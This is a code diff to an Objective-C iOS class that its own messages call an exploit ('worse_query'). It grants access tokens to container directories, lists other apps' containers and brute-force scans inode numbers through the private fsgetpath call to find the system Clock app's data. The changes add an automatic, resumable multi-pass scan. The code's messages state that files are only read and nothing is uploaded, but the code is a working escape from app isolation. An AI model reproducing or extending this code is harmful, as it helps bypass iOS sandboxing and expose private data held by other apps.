@@ -46,6 +46,7 @@ typedef const char *(*ObjectString)(void *);
 @property(nonatomic) NSDate *deadline;
 @property(nonatomic) NSUInteger matches;
 @property(nonatomic) BOOL cacheFailure;
+@property(nonatomic) BOOL scanFinished;
 #ifdef CLOCK_ACCESS_TESTING
 @property(nonatomic) NSString *testGroupRoot;
 #endif
@@ -270,13 +271,13 @@ done:
 - (void)scanInodes {
     typedef ssize_t (*GetPath)(char *,size_t,fsid_t *,uint64_t);
     GetPath getPath=(GetPath)dlsym(RTLD_DEFAULT,"fsgetpath");
-    if(!getPath){[self line:@"fsgetpath unavailable; no inode scan"];return;}
+    if(!getPath){self.scanFinished=YES;[self line:@"fsgetpath unavailable; no inode scan can run on this OS."];return;}
     struct statfs volume;struct stat st;
     NSString *probe=[NSTemporaryDirectory() stringByAppendingPathComponent:NSUUID.UUID.UUIDString];
     int fd=open(probe.fileSystemRepresentation,O_WRONLY|O_CREAT|O_EXCL,0600);
     BOOL ok=fd>=0 && fstat(fd,&st)==0 && fstatfs(fd,&volume)==0;
     if(fd>=0)close(fd);unlink(probe.fileSystemRepresentation);
-    if(!ok){[self line:@"Could not determine the data-volume scan bound"];return;}
+    if(!ok){self.scanFinished=YES;[self line:@"Could not determine the data-volume scan bound; stopping without continuing an empty scan."];return;}
     uint64_t limit=(uint64_t)st.st_ino+100000;
     uint64_t start=(uint64_t)[NSUserDefaults.standardUserDefaults doubleForKey:@"clockProbeCursor"];
     if(start<2 || start>limit)start=2;
@@ -291,31 +292,38 @@ done:
         }
     }
     [NSUserDefaults.standardUserDefaults setDouble:ino>limit?2:(double)ino forKey:@"clockProbeCursor"];
-    [self line:[NSString stringWithFormat:@"Inode discovery: %llu through %llu of %llu. %@",start,ino-1,limit,ino>limit?@"This scan range completed; visibility can still be restricted.":@"Partial scan. Tap again to continue from this position."]];
+    self.scanFinished=(ino>limit || self.matches>0);
+    [self line:[NSString stringWithFormat:@"Inode discovery: %llu through %llu of %llu. %@",start,ino>start?ino-1:start,limit,ino>limit?@"Full inode range completed; visibility can still be restricted.":(self.matches?@"Clock container found; scan stopped.":@"Partial range saved; the automatic scan will continue.")]];
 }
-- (NSString *)run {
+- (NSString *)runPass:(BOOL)firstPass {
     self.report=[NSMutableString new];self.seen=[NSMutableSet new];self.identifiers=[NSMutableDictionary new];
+    self.matches=0;self.scanFinished=NO;
     [self line:@"Clock filesystem experiment (worse_query). No XCTest or Siri invoked.\nAlarm files are read only. No alarm mutation or scheduling is implemented."];
 #if TARGET_OS_SIMULATOR
-    [self line:@"Simulator: exploit disabled. A signed phone is required."];return self.report;
+    [self line:@"Simulator: exploit disabled. A signed phone is required."];self.scanFinished=YES;return self.report;
 #endif
     self.group=[self signedGroup];
-    if(!self.group){[self line:@"STOP -1: No signed, accessible App Group. Re-sign with an App Group supported by the provisioning profile. An entitlement added to an IPA alone is insufficient."];return self.report;}
+    if(!self.group){[self line:@"STOP -1: No signed, accessible App Group. Re-sign with an App Group supported by the provisioning profile. An entitlement added to an IPA alone is insufficient."];self.scanFinished=YES;return self.report;}
     [self line:[NSString stringWithFormat:@"Signed App Group: %@",self.group]];
     self.deadline=[NSDate dateWithTimeIntervalSinceNow:25];
-    [self inspectNamedClockGroup];
-    [self queryCandidates];
-    for(NSString *root in Roots()) {
-        if(self.deadline.timeIntervalSinceNow<=0)break;
-        int64_t h=[self grant:root];NSError *error=nil;
-        NSArray *children=[NSFileManager.defaultManager contentsOfDirectoryAtPath:root error:&error];
-        [self line:[NSString stringWithFormat:@"Container parent %@: token=%lld, list=%@",root,h,children?@"readable":[NSString stringWithFormat:@"error %ld",(long)error.code]]];
-        [self release:h];
-        for(NSString *name in children)[self candidate:[root stringByAppendingPathComponent:name]];
+    if(firstPass) {
+        [self inspectNamedClockGroup];
+        [self queryCandidates];
+        for(NSString *root in Roots()) {
+            if(self.deadline.timeIntervalSinceNow<=0)break;
+            int64_t h=[self grant:root];NSError *error=nil;
+            NSArray *children=[NSFileManager.defaultManager contentsOfDirectoryAtPath:root error:&error];
+            [self line:[NSString stringWithFormat:@"Container parent %@: token=%lld, list=%@",root,h,children?@"readable":[NSString stringWithFormat:@"error %ld",(long)error.code]]];
+            [self release:h];
+            for(NSString *name in children)[self candidate:[root stringByAppendingPathComponent:name]];
+        }
+    } else {
+        [self line:@"Continuing the saved inode scan automatically."];
     }
-    if(self.deadline.timeIntervalSinceNow>0 && !self.cacheFailure)[self scanInodes];
+    if(self.matches) self.scanFinished=YES;
+    if(!self.scanFinished && self.deadline.timeIntervalSinceNow>0 && !self.cacheFailure)[self scanInodes];
     [self line:[NSString stringWithFormat:@"Identified Clock containers: %lu; candidate metadata checked: %lu",(unsigned long)self.matches,(unsigned long)self.seen.count]];
-    if(self.cacheFailure)[self line:@"STOP -18: App Group cache recovery failed. Original contents remain at Library/.daybreak-wq-caches.saved. No further queries attempted."];
+    if(self.cacheFailure){self.scanFinished=YES;[self line:@"STOP -18: App Group cache recovery failed. Original contents remain at Library/.daybreak-wq-caches.saved. No further queries attempted."];}
     [self line:@"Clock service entitlements, live daemon reload, and locked-screen execution are NOT established by this filesystem test. No upload occurred."];
     return self.report;
 }
@@ -324,9 +332,26 @@ done:
 + (void)inspect:(void (^)(NSString *))completion {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY,0),^{
         DBClockInspector *probe=[DBClockInspector new];NSString *report=nil;
-        @try { report=[probe run]; }
+        @try { report=[probe runPass:YES]; }
         @catch(NSException *e) {report=[NSString stringWithFormat:@"%@\nClock inspection stopped: %@",probe.report?:@"",e.name];}
         dispatch_async(dispatch_get_main_queue(),^{completion(report);});
+    });
+}
++ (void)inspectWithProgress:(void (^)(NSString *, BOOL))progress {
+    dispatch_queue_t queue=dispatch_queue_create("com.soum91.daybreak.clock-scan",DISPATCH_QUEUE_SERIAL);
+    dispatch_async(queue,^{
+        BOOL finished=NO,firstPass=YES;NSUInteger pass=0;
+        while(!finished) {
+            @autoreleasepool {
+                DBClockInspector *probe=[DBClockInspector new];NSString *report=nil;
+                @try { report=[probe runPass:firstPass];finished=probe.scanFinished; }
+                @catch(NSException *e) {finished=YES;report=[NSString stringWithFormat:@"%@\nClock inspection stopped: %@",probe.report?:@"",e.name];}
+                firstPass=NO;pass++;
+                NSString *passReport=[NSString stringWithFormat:@"Automatic Clock scan pass %lu\n%@",(unsigned long)pass,report?:@"No report returned."];
+                dispatch_async(dispatch_get_main_queue(),^{progress(passReport,finished);});
+            }
+            if(!finished) usleep(150000);
+        }
     });
 }
 @end
